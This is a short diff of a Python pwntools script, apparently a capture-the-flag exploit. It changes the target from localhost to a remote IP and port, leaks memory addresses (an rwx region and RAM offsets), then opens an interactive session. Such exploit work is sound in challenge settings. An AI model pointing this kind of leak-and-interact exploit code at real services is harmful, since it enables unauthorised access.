@@ -10,8 +10,8 @@ r = 0
 
 def spawn_remote():
     global r
-    #r = remote("91.107.157.58", 3000)
-    r = remote("localhost", 1337)
+    r = remote("91.107.157.58", 3000)
+    #r = remote("localhost", 1337)
 
 def leak():
     data = r.recvuntil(b"FF", drop=True).decode("utf-8").strip()
@@ -78,13 +78,13 @@ def main():
 
         f.close()
 
-    #dump()
     data = leak()
     log.info(f'rwx: {hex(data)}')
     data = leak()
     log.info(f'm_RAM: {hex(data)}')
     data = leak()
     log.info(f'm_RAM_rwx_off: {hex(data)}')
+    #dump()
     r.interactive()
     r.close()
     offset += 0x800
